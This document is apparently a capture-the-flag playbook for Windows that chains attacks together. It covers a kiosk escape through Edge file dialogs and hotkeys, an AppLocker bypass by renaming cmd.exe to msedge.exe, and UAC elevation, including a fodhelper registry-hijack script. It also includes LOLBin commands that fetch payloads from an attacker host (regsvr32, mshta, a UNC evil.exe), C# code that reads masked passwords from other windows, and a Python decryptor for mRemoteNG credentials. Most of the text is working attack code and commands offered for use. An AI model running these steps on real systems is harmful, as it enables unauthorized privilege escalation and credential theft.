# Kiosk Escape + AppLocker Name-Based Bypass + UAC Elevation Chain

## When this applies

- Windows foothold lands in a **restricted shell**: kiosk-mode Edge, RDP RemoteApp, single-app launcher, locked-down terminal user.
- Goal: break out of the kiosk, then bypass AppLocker, then elevate from medium-integrity admin to high-integrity admin.

This file covers three primitives that often appear together on Easy/Medium Windows boxes:

1. **Kiosk escape via Edge `file://`** — turn the only running app into a file browser.
2. **AppLocker name-based bypass** — rename a binary to an allowlisted name.
3. **runas + Start-Process -Verb RunAs** — promote medium-integrity admin to high-integrity admin via the consent dialog.

## Primitive 1 — Kiosk escape via Edge `file://`

When the kiosk launches an Edge/Chrome/IE window as the only UI:

```
file:///C:/                     # directory listing of C:
file:///C:/Users/<user>/Desktop # find user.txt
file:///C:/_admin/profiles.xml  # read arbitrary readable files
```

If the address bar is missing, hotkeys still work:

| Key | Effect |
|----|----|
| `Ctrl-O` | Open file dialog → file picker has full filesystem nav |
| `Ctrl-S` | Save As dialog → same |
| `Ctrl-N` | New window (sometimes adds address bar) |
| `Ctrl-J` | Downloads list (run `.exe` directly from here) |
| `Win` / `Win-R` | Try Start menu / Run — kiosks often forget to disable these |
| `Ctrl-Shift-Esc` | Task Manager — File → Run new task |
| `Shift-F10` in any file dialog | Right-click context menu (Open / Run) |

In any file dialog: type `cmd.exe`, `powershell.exe`, or `\\<attacker>\share\evil.exe` directly into the filename field. If the dialog refuses, type a UNC path to your own SMB share — the dialog will resolve and offer to open.

**Edge download trick.** Even without the address bar visible, `Ctrl-N` + paste a `data:` URL or `https://<attacker>/cmd.exe` triggers a download. Saved to `Downloads`, then run from `Ctrl-J`.

## Primitive 2 — AppLocker name-based bypass

Default kiosk and "managed Edge" AppLocker rule sets allowlist by **filename**, not by hash or signature: `msedge.exe`, `explorer.exe`, `notepad.exe`, `mmc.exe` are usually permitted everywhere a user can read.

**Bypass:** copy `cmd.exe` (or `powershell.exe`, or your downloaded payload) and rename to an allowlisted name:

```cmd
:: From any working entry point (Ctrl-O dialog, downloads folder, SMB share):
copy C:\Windows\System32\cmd.exe %TEMP%\msedge.exe
%TEMP%\msedge.exe
```

```powershell
# PowerShell variant when cmd is fully blocked
Copy-Item C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $env:TEMP\msedge.exe
& "$env:TEMP\msedge.exe"
```

**Locale gotcha — file extensions.** Korean / Japanese / Chinese / German Windows installs often default to "Hide extensions for known file types". The Save-As dialog then quietly appends `.exe` to a name like `msedge.exe`, producing `msedge.exe.exe` — which is NOT allowlisted. Before any rename:

```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t REG_DWORD /d 0 /f
```

or in the Save-As dialog, wrap the filename in double quotes: `"msedge.exe"`.

**Other AppLocker bypasses to keep in mind** (when name-based rename fails):
- Signed-LOLBin path: `regsvr32 /s /i:http://<attacker>/poc.sct scrobj.dll`, `mshta http://...`, `msbuild evil.csproj`, `installutil`, `cscript`/`wscript`. None require admin and most ship in default System32.
- Trusted-folder writeable subdirs: AppLocker's default allowlist trusts `C:\Windows\*` and `C:\Program Files\*`. Look for any subdir of these that the user can write to (`accesschk.exe -wuq "Everyone" C:\Windows`) — common offenders: `C:\Windows\Tasks`, `C:\Windows\Temp`, `C:\Windows\Tracing`, `C:\Windows\System32\spool\drivers\color`.

## Primitive 3 — runas → UAC consent dialog (medium → high integrity)

Once you have admin **credentials** (e.g., recovered via Primitive 4 below), `runas /user:admin cmd` gives a **medium-integrity** shell, not high-integrity. Reading `C:\Users\Administrator\Desktop\root.txt` requires high-integrity.

Two routes from medium-integrity admin:

### Route A — Consent prompt (interactive sessions, easiest)

```powershell
# From the medium-integrity admin shell:
Start-Process powershell -Verb RunAs -ArgumentList '-Command', 'Get-Content C:\Users\Administrator\Desktop\root.txt | Out-File C:\Users\Public\r.txt'
Get-Content C:\Users\Public\r.txt
```

`-Verb RunAs` triggers the UAC consent dialog. On RDP / kiosk sessions where the dialog is rendered, you click "Yes" (or `xdotool key Return` if you're driving RDP from a headless wrapper). The new process is high-integrity and can read Administrator-owned files.

### Route B — UAC bypass (no interactive consent)

When no interactive desktop or `EnableLUA=0` setups apply, fall back to a UAC bypass via the **per-user ProgID hijack** pattern that works for any auto-elevating binary. **Probe first** — older Server builds (e.g., Server 2019 1809) ship some auto-elevating binaries while missing `fodhelper.exe` entirely; `dir C:\Windows\System32\fodhelper.exe sdclt.exe slui.exe eventvwr.exe ComputerDefaults.exe` confirms what's available before committing to a payload.

Auto-elevating launchers that share the same hijackable ProgID:

| Binary | Hijack key | Notes |
|---|---|---|
| `fodhelper.exe` | `HKCU\Software\Classes\ms-settings\Shell\Open\command` | Most common, may be missing on older builds |
| `ComputerDefaults.exe` | `HKCU\Software\Classes\ms-settings\Shell\Open\command` | fodhelper drop-in replacement |
| `sdclt.exe` | `HKCU\Software\Classes\Folder\Shell\Open\command` | Runs Backup-and-Restore, all builds |
| `slui.exe` | `HKCU\Software\Classes\exefile\shell\open\command` | Runs licensing UI |
| `eventvwr.exe` | `HKCU\Software\Classes\mscfile\shell\open\command` | Pre-1709 builds; patched on 1709+ |
| `silentcleanup` (taskschd) | `HKCU\Software\Classes\folder\shell\open\command` | Triggered by maintenance task

```powershell
# fodhelper hijack — auto-elevates because fodhelper runs with autoElevate=true
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -w hidden -c Get-Content C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\r.txt"
Start-Process "C:\Windows\System32\fodhelper.exe"
```

UACMe (https://github.com/hfiref0x/UACME) catalogs every known bypass.

## Primitive 4 — Extract masked passwords (BulletsPassView equivalent)

Many Windows GUI apps (Remote Desktop Plus, mRemoteNG GUI, FileZilla, vendor RDP clients, custom kiosk launchers) display saved passwords as bullets in an Edit control. **`WM_GETTEXT` returns the cleartext** — the bullets are purely a visual rendering (`EM_SETPASSWORDCHAR`). Any process running as the same user can recover them with ~30 lines of P/Invoke:

```csharp
// Compile with: csc /target:exe extract.cs (csc.exe ships in .NET Framework)
using System;
using System.Runtime.InteropServices;
using System.Text;

class P {
  [DllImport("user32.dll")] static extern bool EnumWindows(EnumProc cb, IntPtr l);
  [DllImport("user32.dll")] static extern int GetClassNameW(IntPtr h, StringBuilder s, int n);
  [DllImport("user32.dll")] static extern IntPtr GetWindow(IntPtr h, uint cmd);
  [DllImport("user32.dll")] static extern int SendMessageW(IntPtr h, uint m, IntPtr w, StringBuilder l);
  [DllImport("user32.dll")] static extern int SendMessageW(IntPtr h, uint m, IntPtr w, IntPtr l);
  delegate bool EnumProc(IntPtr h, IntPtr l);

  static void Walk(IntPtr h) {
    var cn = new StringBuilder(64); GetClassNameW(h, cn, 64);
    if (cn.ToString() == "Edit") {
      // Mask char nonzero ⇒ password field
      int mask = SendMessageW(h, 0x00D2 /*EM_GETPASSWORDCHAR*/, IntPtr.Zero, IntPtr.Zero);
      var buf = new StringBuilder(512);
      SendMessageW(h, 0x000D /*WM_GETTEXT*/, (IntPtr)512, buf);
      Console.WriteLine($"mask={mask}\ttext={buf}");
    }
    var c = GetWindow(h, 5 /*GW_CHILD*/);
    while (c != IntPtr.Zero) { Walk(c); c = GetWindow(c, 2 /*GW_HWNDNEXT*/); }
  }
  static void Main() { EnumWindows((h,l)=>{Walk(h);return true;}, IntPtr.Zero); }
}
```

PowerShell `Add-Type` variant works the same way — bake a tiny C# class via `Add-Type -TypeDefinition $code` if `csc` isn't present. Existing tools: NirSoft `BulletsPassView`, `mRemoteNG-Decryptor`, `WindowsCredentialsDecryptor`. Bring your own when the box is air-gapped.

**mRemoteNG `confCons.xml` decryption gotcha.** When the GUI isn't running but the encrypted XML is on disk (`%APPDATA%\mRemoteNG\confCons.xml`), the per-entry `Password` field is `Base64(IV[16] || ciphertext || tag[16])` encrypted with AES-GCM/PBKDF2-SHA1. The default master is `mR3m` (try this even when `EncryptionEngine="AES"` and `BlockCipherMode="GCM"` look "set"). The undocumented step every public Python/PowerShell decoder gets wrong is **AES-GCM `associated_data = ciphertext[:16]`** — without that `cipher.update()` call, the MAC never verifies. Reference implementation:

```python
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2
from Cryptodome.Hash import SHA1
import base64
def decrypt_mremoteng(blob_b64: str, password: str = "mR3m") -> str:
    raw = base64.b64decode(blob_b64); salt, ct, tag = raw[:16], raw[16:-16], raw[-16:]
    key = PBKDF2(password, salt, 32, count=1000, hmac_hash_module=SHA1)
    cipher = AES.new(key, AES.MODE_GCM, nonce=salt); cipher.update(ct[:16])  # ← critical
    return cipher.decrypt_and_verify(ct, tag).decode()
```

## Verifying success

- Kiosk escape: `whoami` returns the kiosk user (not LocalSystem yet); a new cmd/PS window with no address bar limitation.
- AppLocker bypass: the renamed binary spawned without "This app has been blocked by your system administrator".
- UAC elevation: `whoami /groups | findstr Mandatory` shows `S-1-16-12288` (High) instead of `S-1-16-8192` (Medium).
- Masked-password extract: stdout contains the cleartext that the GUI was masking with bullets.

## Common pitfalls

- Renaming `cmd.exe` to `msedge.exe.exe` because extension hiding is on — disable `HideFileExt` first, or quote the filename in Save-As.
- Forgetting that `runas /user:admin` produces medium-integrity — `whoami /groups` always confirms before assuming root-equivalent access.
- Trying `psexec.exe` from inside a kiosk session — local SMB ACLs often block it; `Start-Process -Verb RunAs` works because it stays in-session.
- Driving RDP from a headless macOS/Linux wrapper without enabling extension display first → silent `.exe.exe` rename failure.

## Tools

- AccessChk (Sysinternals — find writable allowlisted paths)
- UACMe (UAC bypass catalog)
- NirSoft BulletsPassView (offline alternative to the WM_GETTEXT one-liner above)
- xfreerdp + xdotool (driving RDP from a headless attacker host)
